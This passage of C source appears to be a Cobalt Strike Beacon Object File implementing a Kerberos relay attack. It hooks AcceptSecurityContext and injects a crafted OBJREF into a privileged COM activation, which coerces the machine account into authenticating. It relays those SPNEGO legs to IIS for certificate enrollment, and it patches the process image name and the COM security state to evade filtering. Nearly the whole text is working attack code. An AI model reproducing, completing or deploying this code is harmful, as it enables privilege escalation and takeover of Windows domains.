    g_state.stage=64;if(!CRYPT32$CryptStringToBinaryW(display+7,display_len-8,CRYPT_STRING_BASE64,NULL,&original_len,NULL,NULL)||original_len<70){g_state.stage=641;goto objref_done;}
    original=(BYTE*)alloc(original_len);if(!original)goto objref_done;
    if(!CRYPT32$CryptStringToBinaryW(display+7,display_len-8,CRYPT_STRING_BASE64,original,&original_len,NULL,NULL)){g_state.stage=642;goto objref_done;}
    g_state.detail=(int)original_len;
objref_done:
    OLE32$CoTaskMemFree(display);IBindCtx_Release(bind);IMoniker_Release(moniker);
raw_objref_ready:
    if(!original||original_len<68||rd16(original)!=0x454d){release(original);return 0;}
    while(g_state.rpc_host[address_chars])address_chars++;address_words=address_chars+1;
    g_state.stage=65;string_words=1+address_words+1;
    if(rd16(original+66)>rd16(original+64)){release(original);return 0;}
#ifdef KRBRELAY_TEST_REMOTE_RESOLVER
    sec_words=1;security=NULL;
#else
    if(g_state.synthesize_security){while(g_state.service_spn[spn_chars])spn_chars++;sec_words=spn_chars+4;security=NULL;}
    else{sec_words=rd16(original+64)-rd16(original+66);security=original+68+rd16(original+66)*2;if(!sec_words||(rd16(security)!=RPC_C_AUTHN_GSS_NEGOTIATE&&rd16(security)!=RPC_C_AUTHN_GSS_KERBEROS)){g_state.stage=66;release(original);return 0;}}
#endif
#ifndef KRBRELAY_TEST_REMOTE_RESOLVER
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Building OBJREF with auth type %u\n",g_state.synthesize_security?RPC_C_AUTHN_GSS_NEGOTIATE:rd16(security));
#endif
    total_words=string_words+sec_words;
    g_state.trigger.objref_len=68+total_words*2;
    g_state.trigger.objref=(BYTE*)alloc(g_state.trigger.objref_len); if(!g_state.trigger.objref){release(original);return 0;}
    p=g_state.trigger.objref; kcopy(p,original,64); p+=64;
    wr16(p,(WORD)total_words); wr16(p+2,(WORD)string_words); p+=4;
    wr16(p,7); p+=2;
    for(i=0;i<address_words;i++){wr16(p,g_state.rpc_host[i]);p+=2;}
    wr16(p,0);p+=2;
#ifdef KRBRELAY_TEST_REMOTE_RESOLVER
    wr16(p,0);
#else
    if(g_state.synthesize_security){wr16(p,RPC_C_AUTHN_GSS_NEGOTIATE);wr16(p+2,0xffff);p+=4;for(i=0;i<=spn_chars;i++){wr16(p,g_state.service_spn[i]);p+=2;}wr16(p,0);}
    else kcopy(p,security,sec_words*2);
#endif
    release(original);
    return 1;
}

static HRESULT direct_local_activation(CLSID *clsid) {
    RPC_WSTR text_binding=NULL;RPC_BINDING_HANDLE binding=NULL;RPC_STATUS rpc_status;RPC_MESSAGE message;UUID cid;
    BYTE *request=NULL,*p;ULONG object_size=(g_state.trigger.objref_len+3)&~3u,request_size=110+object_size;HRESULT activation_result=E_FAIL;
    request=(BYTE*)alloc(request_size);if(!request)return E_OUTOFMEMORY;p=request;
    wr16(p,5);wr16(p+2,7);wr32(p+4,1);RPCRT4$UuidCreate(&cid);kcopy(p+12,&cid,16);p+=32;
    kcopy(p,clsid,16);p+=16;wr32(p,0);wr32(p+4,0x00020000);p+=8;
    wr32(p,g_state.trigger.objref_len);wr32(p+4,g_state.trigger.objref_len);p+=8;kcopy(p,g_state.trigger.objref,g_state.trigger.objref_len);p+=object_size;
    wr32(p,3);wr32(p+4,0);wr32(p+8,1);wr32(p+12,0x00020004);p+=16;
    wr32(p,1);p+=4;kcopy(p,&KIID_IUnknown,16);p+=16;
    wr16(p,1);wr16(p+2,0);p+=4;wr32(p,1);wr16(p+4,7);
#ifdef KRBRELAY_TEST_NCALRPC_ACTIVATION
    rpc_status=RPCRT4$RpcStringBindingComposeW(NULL,(RPC_WSTR)L"ncalrpc",NULL,NULL,NULL,&text_binding);
#else
    rpc_status=RPCRT4$RpcStringBindingComposeW(NULL,(RPC_WSTR)L"ncacn_ip_tcp",(RPC_WSTR)g_state.rpc_host,(RPC_WSTR)L"135",NULL,&text_binding);
#endif
    if(rpc_status){activation_result=(HRESULT)(0x80070000u|rpc_status);goto done;}
    rpc_status=RPCRT4$RpcBindingFromStringBindingW(text_binding,&binding);if(rpc_status){activation_result=(HRESULT)(0x80070000u|rpc_status);goto done;}
#ifdef KRBRELAY_TEST_NCALRPC_ACTIVATION
    rpc_status=RPCRT4$RpcEpResolveBinding(binding,(RPC_IF_HANDLE)&activation_interface);if(rpc_status){activation_result=(HRESULT)(0x80070000u|rpc_status);goto done;}
#endif
#ifndef KRBRELAY_TEST_RPC_NO_AUTH
    rpc_status=RPCRT4$RpcBindingSetAuthInfoW(binding,NULL,RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,RPC_C_AUTHN_GSS_NEGOTIATE,NULL,RPC_C_AUTHZ_NONE);if(rpc_status){activation_result=(HRESULT)(0x80070000u|rpc_status);goto done;}
#endif
    kzero(&message,sizeof(message));message.Handle=binding;message.DataRepresentation=0x10;message.BufferLength=request_size;message.ProcNum=0;message.TransferSyntax=(PRPC_SYNTAX_IDENTIFIER)&activation_interface.TransferSyntax;message.RpcInterfaceInformation=(void*)&activation_interface;
#ifdef KRBRELAY_TEST_RPC_MAYBE
    message.RpcFlags=RPC_NCA_FLAGS_MAYBE;
#endif
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Issuing direct authenticated IActivation::RemoteActivation to local RPCSS\n");g_state.stage=85;
#ifdef KRBRELAY_TEST_SKIP_RPC_CALL
    goto done;
#endif
    rpc_status=RPCRT4$I_RpcGetBuffer(&message);if(rpc_status){activation_result=(HRESULT)(0x80070000u|rpc_status);goto done;}
#ifdef KRBRELAY_TEST_SKIP_RPC_SEND
    goto done;
#endif
    kcopy(message.Buffer,request,request_size);g_state.stage=87;
#ifdef KRBRELAY_TEST_RPC_SEND_ONLY
    rpc_status=RPCRT4$I_RpcSend(&message);
    if(!rpc_status)KERNEL32$Sleep(3000);
#else
    rpc_status=RPCRT4$I_RpcSendReceive(&message);
#ifdef KRBRELAY_TEST_RPC_MAYBE
    if(!rpc_status)KERNEL32$Sleep(3000);
#endif
#endif
    if(rpc_status)activation_result=(HRESULT)(0x80070000u|rpc_status);else activation_result=S_OK;
done:
    if(message.Buffer)RPCRT4$I_RpcFreeBuffer(&message);if(binding)RPCRT4$RpcBindingFree(&binding);if(text_binding)RPCRT4$RpcStringFreeW(&text_binding);release(request);return activation_result;
}

#ifdef KRBRELAY_TEST_NDR_ACTIVATION
static HRESULT direct_ndr_activation(CLSID *clsid) {
    RPC_WSTR text_binding=NULL;RPC_BINDING_HANDLE binding=NULL;RPC_STATUS rpc_status,call_status;
    KORPCTHIS orpcthis;KORPCTHAT orpcthat;KMInterfacePointer *storage=NULL,*interfaces_out[1];
    KOXID oxid=0;KDUALSTRINGARRAY *bindings=NULL;KIPID ipid;ULONG auth_hint=0;KCOMVERSION server_version;
    HRESULT remote_hr=E_FAIL,results[1];GUID iid=KIID_IUnknown;unsigned short protseq=7;UUID cid;SIZE_T storage_size;
    storage_size=sizeof(KMInterfacePointer)-sizeof(storage->abData)+g_state.trigger.objref_len;
    storage=(KMInterfacePointer*)alloc(storage_size);if(!storage)return E_OUTOFMEMORY;
    storage->ulCntData=g_state.trigger.objref_len;kcopy(storage->abData,g_state.trigger.objref,g_state.trigger.objref_len);
    kzero(&orpcthis,sizeof(orpcthis));orpcthis.version.MajorVersion=5;orpcthis.version.MinorVersion=7;orpcthis.flags=1;RPCRT4$UuidCreate(&cid);kcopy(&orpcthis.cid,&cid,sizeof(cid));
    kzero(&orpcthat,sizeof(orpcthat));kzero(&ipid,sizeof(ipid));kzero(&server_version,sizeof(server_version));interfaces_out[0]=NULL;results[0]=E_FAIL;
    #ifdef KRBRELAY_TEST_NCALRPC_ACTIVATION
    rpc_status=RPCRT4$RpcStringBindingComposeW(NULL,(RPC_WSTR)L"ncalrpc",NULL,NULL,NULL,&text_binding);
    #else
    rpc_status=RPCRT4$RpcStringBindingComposeW(NULL,(RPC_WSTR)L"ncacn_ip_tcp",(RPC_WSTR)L"127.0.0.1",(RPC_WSTR)L"135",NULL,&text_binding);
    #endif
    if(rpc_status)goto done;
    rpc_status=RPCRT4$RpcBindingFromStringBindingW(text_binding,&binding);if(rpc_status)goto done;
    #ifdef KRBRELAY_TEST_NCALRPC_ACTIVATION
    rpc_status=RPCRT4$RpcEpResolveBinding(binding,IKrbActivation_v0_0_c_ifspec);if(rpc_status)goto done;
    #endif
    #ifndef KRBRELAY_TEST_RPC_NO_AUTH
    rpc_status=RPCRT4$RpcBindingSetAuthInfoW(binding,NULL,RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,RPC_C_AUTHN_GSS_NEGOTIATE,NULL,RPC_C_AUTHZ_NONE);if(rpc_status)goto done;
    #endif
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Issuing generated-NDR IActivation::RemoteActivation to local RPCSS\n");g_state.stage=86;
    call_status=KrbRemoteActivation(binding,&orpcthis,&orpcthat,clsid,NULL,storage,RPC_C_IMP_LEVEL_IMPERSONATE,0,1,&iid,1,&protseq,&oxid,&bindings,&ipid,&auth_hint,&server_version,&remote_hr,interfaces_out,results);
    g_state.detail=call_status?(int)call_status:(int)remote_hr;rpc_status=call_status;
done:
    if(binding)RPCRT4$RpcBindingFree(&binding);if(text_binding)RPCRT4$RpcStringFreeW(&text_binding);release(storage);
    return rpc_status?(HRESULT)(0x80070000u|rpc_status):remote_hr;
}
#endif

static int extract_rpc(PSecBufferDesc input, BYTE **rpc, ULONG *rpc_len) {
    /* One RPC PDU can span several SECBUFFER_DATA entries. Flatten it before
       using frag_length/auth_length to locate the authentication trailer. */
    ULONG i,n=0,off=0; BYTE *p;
    if(!input||!input->pBuffers||!input->cBuffers)return 0;
    for(i=0;i<input->cBuffers;i++){if(input->pBuffers[i].cbBuffer>MAX_TOKEN-n)return 0;n+=input->pBuffers[i].cbBuffer;}
    if(n<16)return 0; p=(BYTE*)alloc(n); if(!p)return 0;
    for(i=0;i<input->cBuffers;i++){kcopy(p+off,input->pBuffers[i].pvBuffer,input->pBuffers[i].cbBuffer);off+=input->pBuffers[i].cbBuffer;}
    *rpc=p;*rpc_len=n;return 1;
}

static SecBuffer *output_auth_buffer(PSecBufferDesc output,ULONG *index_out) {
    /* Locate the runtime TOKEN slot. Its position differs across Windows/RPCSS
       contexts, which is why the inherited fixed +116 offset was unreliable. */
    ULONG i;
    if(index_out)*index_out=0;
    if(!output||!output->pBuffers||!output->cBuffers)return NULL;
    for(i=0;i<output->cBuffers;i++)if((output->pBuffers[i].BufferType&0xffff)==SECBUFFER_TOKEN&&output->pBuffers[i].pvBuffer){if(index_out)*index_out=i;return &output->pBuffers[i];}
    return NULL;
}

#ifdef KRBRELAY_ENABLE_AUTH_CONVERSION
static int relay_as_impersonated_client(PCtxtHandle inbound_context) {
    /* Fallback for a non-Kerberos local callback: impersonate its accepted
       machine context and have SSPI create an outbound token for the SPN. */
    CredHandle credential;CtxtHandle client_context;TimeStamp expiry;ULONG attrs=0;SECURITY_STATUS status;
    SecBuffer output_buffer,input_buffer;SecBufferDesc output_desc,input_desc;BYTE *output=NULL,*reply=NULL;ULONG reply_len=0;BYTE kind=0;int ok=0;
    if(!inbound_context||!g_state.table->ImpersonateSecurityContext||!g_state.table->AcquireCredentialsHandleW||!g_state.table->InitializeSecurityContextW){BeaconPrintf(CALLBACK_ERROR,"[-] SSPI Kerberos conversion APIs unavailable\n");return 0;}
    kzero(&credential,sizeof(credential));kzero(&client_context,sizeof(client_context));
    status=g_state.table->ImpersonateSecurityContext(inbound_context);if(status!=SEC_E_OK){BeaconPrintf(CALLBACK_ERROR,"[-] Cannot impersonate inbound COM context (SSPI 0x%08x)\n",(ULONG)status);return 0;}
    status=g_state.table->AcquireCredentialsHandleW(NULL,(SEC_WCHAR*)L"Negotiate",SECPKG_CRED_OUTBOUND,NULL,NULL,NULL,NULL,&credential,&expiry);
    if(status!=SEC_E_OK){BeaconPrintf(CALLBACK_ERROR,"[-] Cannot acquire outbound Negotiate credentials as COM client (SSPI 0x%08x)\n",(ULONG)status);goto auth_done;}
    output=(BYTE*)alloc(12288);if(!output)goto credential_done;
    output_buffer.BufferType=SECBUFFER_TOKEN;output_buffer.cbBuffer=12288;output_buffer.pvBuffer=output;
    output_desc.ulVersion=SECBUFFER_VERSION;output_desc.cBuffers=1;output_desc.pBuffers=&output_buffer;
    status=g_state.table->InitializeSecurityContextW(&credential,NULL,(SEC_WCHAR*)g_state.service_spn,ISC_REQ_MUTUAL_AUTH|ISC_REQ_REPLAY_DETECT|ISC_REQ_SEQUENCE_DETECT,0,SECURITY_NATIVE_DREP,NULL,0,&client_context,&output_desc,&attrs,&expiry);
    if(status!=SEC_I_CONTINUE_NEEDED&&status!=SEC_E_OK){BeaconPrintf(CALLBACK_ERROR,"[-] Cannot initialize Kerberos service context (SSPI 0x%08x)\n",(ULONG)status);goto context_done;}
    if(!output_buffer.cbBuffer||!bridge_connect()||!send_record(BRIDGE_CLIENT_TOKEN,output,output_buffer.cbBuffer)||!recv_auth_reply(&kind,&reply,&reply_len))goto context_done;
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Forwarded a Kerberos/Negotiate client leg from the impersonated machine context\n");
    if(kind==BRIDGE_SERVER_TOKEN&&reply_len){
        input_buffer.BufferType=SECBUFFER_TOKEN;input_buffer.cbBuffer=reply_len;input_buffer.pvBuffer=reply;
        input_desc.ulVersion=SECBUFFER_VERSION;input_desc.cBuffers=1;input_desc.pBuffers=&input_buffer;
        output_buffer.cbBuffer=12288;kzero(output,12288);
        status=g_state.table->InitializeSecurityContextW(&credential,&client_context,(SEC_WCHAR*)g_state.service_spn,ISC_REQ_MUTUAL_AUTH|ISC_REQ_REPLAY_DETECT|ISC_REQ_SEQUENCE_DETECT,0,SECURITY_NATIVE_DREP,&input_desc,0,&client_context,&output_desc,&attrs,&expiry);
        release(reply);reply=NULL;
        if(status!=SEC_I_CONTINUE_NEEDED&&status!=SEC_E_OK)goto context_done;
        if(output_buffer.cbBuffer&&(!send_record(BRIDGE_CLIENT_TOKEN,output,output_buffer.cbBuffer)||!recv_auth_reply(&kind,&reply,&reply_len)))goto context_done;
    }
    if(kind!=BRIDGE_AUTH_OK){if(kind==BRIDGE_ERROR)report_bridge_error(reply,reply_len);goto context_done;}
    g_state.success=1;ok=1;BeaconPrintf(CALLBACK_OUTPUT,"[+] IIS authenticated the relayed machine connection\n");
context_done:
    if(client_context.dwLower||client_context.dwUpper)g_state.table->DeleteSecurityContext(&client_context);
    release(output);release(reply);
credential_done:
    g_state.table->FreeCredentialsHandle(&credential);
auth_done:
    g_state.table->RevertSecurityContext(inbound_context);
    return ok;
}
#endif

static SECURITY_STATUS SEC_ENTRY accept_hook(PCredHandle cred,PCtxtHandle context,PSecBufferDesc input,ULONG req,ULONG rep,PCtxtHandle newctx,PSecBufferDesc output,PULONG attrs,PTimeStamp expiry) {
    /*
     * For each DCE/RPC leg, relay the opaque auth_value to IIS. Run the real
     * acceptor with isolated output to advance RPCSS state, then place IIS's
     * continuation in RPCSS's actual TOKEN buffer and set its true length.
     * The privileged client consequently consumes the AP-REP and emits the
     * next SPNEGO leg without the BOF needing Kerberos keys or ASN.1 mutation.
     */
    BYTE *rpc=NULL,*reply=NULL,*out_target=NULL; ULONG rpc_len=0,reply_len=0,auth_len=0,frag_len=0,token_off=0,out_index=0,out_off=0,i; BYTE kind=0,auth_type=0;int relay_rpc=0;
    SecBuffer tempbuf; SecBufferDesc tempdesc; SECURITY_STATUS status;
    atomic_add(&g_state.active_callbacks,1);
    if(g_state.success){status=g_state.original_accept(cred,context,input,req,rep,newctx,output,attrs,expiry);goto accept_return;}
    if(extract_rpc(input,&rpc,&rpc_len)){
        frag_len=rd16(rpc+8);auth_len=rd16(rpc+10);
        if(rpc[0]==5&&(rpc[4]&0xf0)==0x10&&auth_len&&frag_len<=rpc_len&&frag_len>=8&&auth_len<=frag_len-8){token_off=frag_len-auth_len;auth_type=rpc[token_off-8];
            relay_rpc=auth_type==RPC_C_AUTHN_GSS_NEGOTIATE||auth_type==RPC_C_AUTHN_GSS_KERBEROS;
            BeaconPrintf(CALLBACK_OUTPUT,"[*] Captured RPC auth type %u / leg %d (fragment %lu bytes, auth_value %lu bytes, top tag 0x%02x)\n",rpc[token_off-8],g_state.callback_count+1,frag_len,auth_len,rpc[token_off]);
        }
        if(relay_rpc&&bridge_connect()&&send_record(BRIDGE_CLIENT_TOKEN,rpc+token_off,auth_len)&&recv_auth_reply(&kind,&reply,&reply_len)){
            BeaconPrintf(CALLBACK_OUTPUT,"[*] Relayed opaque SPNEGO leg %d\n",g_state.callback_count+1);
            if(kind==BRIDGE_SERVER_TOKEN&&reply_len){BeaconPrintf(CALLBACK_OUTPUT,"[+] Received IIS continuation (%lu bytes, top tag 0x%02x); preparing it for the RPCSS response\n",reply_len,reply[0]);g_state.trace|=32;release(g_state.continuation);g_state.continuation=reply;g_state.continuation_len=reply_len;reply=NULL;}
            else if(kind==BRIDGE_AUTH_OK){g_state.success=1;BeaconPrintf(CALLBACK_OUTPUT,"[+] IIS authenticated the relayed machine connection; Python now owns enrollment\n");}
            else if(kind==BRIDGE_ERROR)report_bridge_error(reply,reply_len);
        }
    }
    release(rpc);release(reply);
    if(!relay_rpc){status=g_state.original_accept(cred,context,input,req,rep,newctx,output,attrs,expiry);goto accept_return;}
    tempbuf.BufferType=SECBUFFER_TOKEN;tempbuf.cbBuffer=12288;tempbuf.pvBuffer=alloc(tempbuf.cbBuffer);
    tempdesc.ulVersion=SECBUFFER_VERSION;tempdesc.cBuffers=1;tempdesc.pBuffers=&tempbuf;
    status=g_state.original_accept(cred,context,input,req,rep,newctx,&tempdesc,attrs,expiry);release(tempbuf.pvBuffer);
    if(g_state.continuation&&output&&output->cBuffers){
        SecBuffer *o=output_auth_buffer(output,&out_index);
        BeaconPrintf(CALLBACK_OUTPUT,"[*] RPCSS output has %lu buffers",output->cBuffers);
        for(i=0;i<output->cBuffers&&i<8;i++)BeaconPrintf(CALLBACK_OUTPUT," [#%lu type=0x%08x size=%lu]",i+1,output->pBuffers[i].BufferType,output->pBuffers[i].cbBuffer);
        BeaconPrintf(CALLBACK_OUTPUT,"\n");
        if(o){if(output->pBuffers[0].pvBuffer&&(BYTE*)o->pvBuffer>(BYTE*)output->pBuffers[0].pvBuffer&&(BYTE*)o->pvBuffer-(BYTE*)output->pBuffers[0].pvBuffer<4096)out_off=(ULONG)((BYTE*)o->pvBuffer-(BYTE*)output->pBuffers[0].pvBuffer);out_target=(BYTE*)o->pvBuffer;BeaconPrintf(CALLBACK_OUTPUT,"[*] Original Unicode SSPI acceptor returned 0x%08x; using runtime token buffer %lu/%lu (offset %lu)\n",(ULONG)status,out_index+1,output->cBuffers,out_off);}
        if(!o||!out_target){const BYTE message[]="RPCSS exposed no writable token buffer";g_state.bridge_failed=1;send_record(BRIDGE_ERROR,message,sizeof(message)-1);BeaconPrintf(CALLBACK_ERROR,"[-] RPCSS exposed no writable token buffer; refusing fixed-offset injection\n");status=SEC_E_BUFFER_TOO_SMALL;goto accept_done;}
        if(g_state.continuation_len>o->cbBuffer){const BYTE message[]="IIS continuation exceeds RPCSS token buffer";g_state.bridge_failed=1;send_record(BRIDGE_ERROR,message,sizeof(message)-1);BeaconPrintf(CALLBACK_ERROR,"[-] IIS continuation length %lu exceeds RPCSS token-buffer capacity %lu\n",g_state.continuation_len,o->cbBuffer);status=SEC_E_BUFFER_TOO_SMALL;goto accept_done;}
        g_state.trace|=64;kcopy(out_target,g_state.continuation,g_state.continuation_len);
        o->cbBuffer=g_state.continuation_len;BeaconPrintf(CALLBACK_OUTPUT,"[*] Published RPCSS token length %lu for RPC leg %d\n",o->cbBuffer,g_state.callback_count+1);
        BeaconPrintf(CALLBACK_OUTPUT,"[*] Injected and consumed the IIS continuation for RPC leg %d\n",g_state.callback_count+1);
        release(g_state.continuation);g_state.continuation=NULL;g_state.continuation_len=0;
    }
accept_done:
    release(g_state.continuation);g_state.continuation=NULL;g_state.continuation_len=0;
    g_state.callback_count++;
accept_return:
    atomic_add(&g_state.active_callbacks,-1);
    return status;
}

static int install_hook(void) {
    /* Swap only sspicli's AcceptSecurityContext table pointer and retain the
       original for state progression and guaranteed cleanup restoration. */
    DWORD old=0,tmp; g_state.table=SECUR32$InitSecurityInterfaceW(); if(!g_state.table)return 0;
    g_state.original_accept=g_state.table->AcceptSecurityContext;
    if(!KERNEL32$VirtualProtect(&g_state.table->AcceptSecurityContext,sizeof(void*),PAGE_READWRITE,&old))return 0;
    g_state.table->AcceptSecurityContext=accept_hook;
    KERNEL32$VirtualProtect(&g_state.table->AcceptSecurityContext,sizeof(void*),old,&tmp);
    return 1;
}
static void remove_hook(void){DWORD old,tmp;if(g_state.table&&g_state.original_accept&&KERNEL32$VirtualProtect(&g_state.table->AcceptSecurityContext,sizeof(void*),PAGE_READWRITE,&old)){g_state.table->AcceptSecurityContext=g_state.original_accept;KERNEL32$VirtualProtect(&g_state.table->AcceptSecurityContext,sizeof(void*),old,&tmp);}}

static LONG *find_com_security_gate(void) {
    HMODULE module=KERNEL32$GetModuleHandleW(L"combase.dll");BYTE *entry;ULONG i;
    if(!module)return NULL;entry=(BYTE*)KERNEL32$GetProcAddress(module,"CoInitializeSecurity");if(!entry)return NULL;
    for(i=0;i<256;i++)if(entry[i]==0x39&&entry[i+1]==0x3d&&entry[i+6]==0x0f&&entry[i+7]==0x84){LONG displacement=*(LONG*)(entry+i+2);return (LONG*)(entry+i+6+displacement);}
    return NULL;
}

static int release_caller_com_apartment(void) {
    /* If the long-lived Beacon task thread retained COM from an earlier
       operation, balance that thread's apartment references before creating
       the BOF-owned STA. CoInitializeEx is used only to distinguish whether a
       reference existed; every successful probe reference is balanced. */
    LONG *gate=find_com_security_gate();HRESULT hr;int released=0,i;
    if(!gate||!*gate)return 0;
    for(i=0;i<8;i++){
        hr=OLE32$CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
        if(hr==S_OK){OLE32$CoUninitialize();break;}
        if(hr==S_FALSE){OLE32$CoUninitialize();OLE32$CoUninitialize();released++;continue;}
        if(hr==RPC_E_CHANGED_MODE){OLE32$CoUninitialize();released++;continue;}
        break;
    }
    return released;
}

static KUNICODE_STRING *patch_firewall_name(BYTE saved[14]) {
    /* RPCSS filters returned TCP bindings using the registered image name.
       Present "System" only while COM security registers the endpoint, then
       restore the original seven UTF-16 code units immediately. */
    KPROCESS_BASIC_INFORMATION pbi; ULONG returned=0; void *params; KUNICODE_STRING *name;
    const BYTE system_name[14]={'S',0,'y',0,'s',0,'t',0,'e',0,'m',0,0,0};
    kzero(&pbi,sizeof(pbi));
    if(NTDLL$NtQueryInformationProcess(KERNEL32$GetCurrentProcess(),0,&pbi,sizeof(pbi),&returned)<0||!pbi.PebBaseAddress)return NULL;
    params=*(void **)((BYTE*)pbi.PebBaseAddress+0x20);if(!params)return NULL;
    name=(KUNICODE_STRING*)((BYTE*)params+0x60);if(!name->Buffer||name->MaximumLength<14)return NULL;
    kcopy(saved,name->Buffer,14);kcopy(name->Buffer,system_name,14);return name;
}

static int run_relay(void) {
    /* Stage families: 10/20 COM+hook; 25-31 security; 40 OBJREF; 50 RPC
       endpoint; 60 storage; 70-73 activation/relay; 80 confirmed cert. */
    CLSID clsid;
    SOLE_AUTHENTICATION_SERVICE svc; COSERVERINFO server; COAUTHINFO auth; ILockBytes*lb=NULL; IStorage*storage=NULL; MULTI_QI qi; HRESULT hr; HANDLE activation_token=NULL; BYTE saved_name[14]; KUNICODE_STRING *image_name;LONG *security_gate=NULL,saved_gate=0;void **security_info=NULL,*saved_security_info=NULL;DWORD gate_protection=0,temp_protection=0;
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Initializing the COM STA\n");
    g_state.stage=10;hr=OLE32$CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
    if(FAILED(hr))return 0;
    g_state.com_ready=1;
    if(FAILED(OLE32$CLSIDFromString(g_state.trigger_clsid,&clsid))){g_state.stage=11;return 0;}
    g_state.stage=20;if(!install_hook())return 0;
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Installed the Unicode AcceptSecurityContext relay hook\n");
    kzero(&svc,sizeof(svc));svc.dwAuthnSvc=RPC_C_AUTHN_GSS_NEGOTIATE;svc.pPrincipalName=g_state.service_spn;
    g_state.stage=25;image_name=patch_firewall_name(saved_name);if(!image_name)return 0;
    g_state.stage=30;hr=OLE32$CoInitializeSecurity(NULL,1,&svc,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_DYNAMIC_CLOAKING,NULL);
    kcopy(image_name->Buffer,saved_name,14);
#ifdef KRBRELAY_TEST_RESET_COM_SECURITY_GATE
    if(hr==RPC_E_TOO_LATE&&(security_gate=find_com_security_gate())&&KERNEL32$VirtualProtect(security_gate,sizeof(*security_gate),PAGE_READWRITE,&gate_protection)){
        security_info=(void**)((BYTE*)security_gate-0x20);saved_gate=*security_gate;saved_security_info=*security_info;BeaconPrintf(CALLBACK_OUTPUT,"[*] Located initialized COM security registration state %ld\n",saved_gate);*security_gate=0;*security_info=NULL;KERNEL32$VirtualProtect(security_gate,sizeof(*security_gate),gate_protection,&temp_protection);
        image_name=patch_firewall_name(saved_name);if(image_name){hr=OLE32$CoInitializeSecurity(NULL,1,&svc,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_DYNAMIC_CLOAKING,NULL);kcopy(image_name->Buffer,saved_name,14);}
        BeaconPrintf(CALLBACK_OUTPUT,"[*] Reinitialization returned HRESULT 0x%08x\n",(ULONG)hr);
        if(FAILED(hr)&&KERNEL32$VirtualProtect(security_gate,sizeof(*security_gate),PAGE_READWRITE,&gate_protection)){*security_gate=saved_gate;*security_info=saved_security_info;KERNEL32$VirtualProtect(security_gate,sizeof(*security_gate),gate_protection,&temp_protection);}
    }
#endif
    if(hr==RPC_E_TOO_LATE){g_state.stage=32;g_state.detail=(int)hr;BeaconPrintf(CALLBACK_ERROR,"[-] Process COM security is already immutable; run this direct BOF first in a fresh Beacon\n");return 0;}
    else if(FAILED(hr)){g_state.detail=(int)hr;return 0;}
    if(!g_state.com_locked&&FAILED(svc.hr)){g_state.stage=31;g_state.detail=(int)svc.hr;return 0;}
    if(g_state.com_locked)g_state.synthesize_security=1;
#ifdef KRBRELAY_TEST_SYNTHESIZED_SECURITY
    g_state.synthesize_security=1;
#endif
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Configured caller-supplied COM Negotiate service principal\n");
    g_state.anchor.lpVtbl=&anchor_vtbl;g_state.anchor.refs=1;
    g_state.trigger.storageVtbl=&storage_vtbl;g_state.trigger.marshalVtbl=&marshal_vtbl;g_state.trigger.refs=1;
    g_state.stage=40;if(!build_objref())return 0;
    g_state.stage=50;if(RPCRT4$RpcServerUseProtseqEpW((RPC_WSTR)L"ncacn_ip_tcp",20,(RPC_WSTR)g_state.rpc_endpoint,NULL))return 0;
    if(RPCRT4$RpcServerRegisterAuthInfoW(NULL,RPC_C_AUTHN_GSS_NEGOTIATE,NULL,NULL))return 0;
    if(RPCRT4$RpcServerRegisterIfEx((RPC_IF_HANDLE)&resolver_interface,NULL,NULL,RPC_IF_AUTOLISTEN,1,NULL))return 0;g_state.resolver_registered=1;
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Registered COM RPC endpoint with SPNEGO\n");
    /* Keep local activation under the caller's normal token.  A NEW_CREDENTIALS
       token changes activation authorization and can make RPCSS reject the call
       before it unmarshals the supplied OBJREF. */
    g_state.stage=60;if(FAILED(OLE32$CreateILockBytesOnHGlobal(NULL,TRUE,&lb)))return 0;
    if(FAILED(OLE32$StgCreateDocfileOnILockBytes(lb,STGM_CREATE|STGM_READWRITE|STGM_SHARE_EXCLUSIVE,0,&storage)))return 0;
    g_state.trigger.backing=storage;
    kzero(&qi,sizeof(qi));qi.pIID=&KIID_IUnknown;
    kzero(&server,sizeof(server));kzero(&auth,sizeof(auth));
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Activating the known-good privileged COM class\n");
    g_state.stage=70;
#ifdef KRBRELAY_TEST_DIRECT_ACTIVATION
    if(g_state.com_locked){
#ifdef KRBRELAY_TEST_NDR_ACTIVATION
        hr=direct_ndr_activation(&clsid);
#else
        hr=direct_local_activation(&clsid);
#endif
    }
    else hr=OLE32$CoGetInstanceFromIStorage(NULL,&clsid,NULL,CLSCTX_LOCAL_SERVER,(IStorage*)&g_state.trigger,1,&qi);
#else
    hr=OLE32$CoGetInstanceFromIStorage(NULL,&clsid,NULL,CLSCTX_LOCAL_SERVER,(IStorage*)&g_state.trigger,1,&qi);
#endif
    if(activation_token){ADVAPI32$RevertToSelf();KERNEL32$CloseHandle(activation_token);activation_token=NULL;}
    g_state.detail=(int)hr;
    if(qi.pItf)IUnknown_Release(qi.pItf);
    release(g_state.trigger.objref);g_state.trigger.objref=NULL;
    IStorage_Release(storage);ILockBytes_Release(lb);
    /* COM commonly reports access denied after the useful callbacks. Treat it
       as success only if Python confirmed that IIS authenticated the relayed
       machine connection; enrollment continues independently in Python. */
    if(g_state.success){g_state.stage=80;return 1;}
    if(g_state.bridge_failed){g_state.stage=73;return 0;}
    if(FAILED(hr)){g_state.stage=71;return 0;}
    if(FAILED(qi.hr)){g_state.stage=72;g_state.detail=(int)qi.hr;return 0;}
    g_state.stage=80;return g_state.success;
}

static void wait_callback_quiescence(void) {
    ULONG i,quiet=0;
    for(i=0;i<500;i++){
        if(atomic_read(&g_state.active_callbacks)==0){if(++quiet>=25)return;}
        else quiet=0;
        KERNEL32$Sleep(10);
    }
}

static void cleanup_relay(void) {
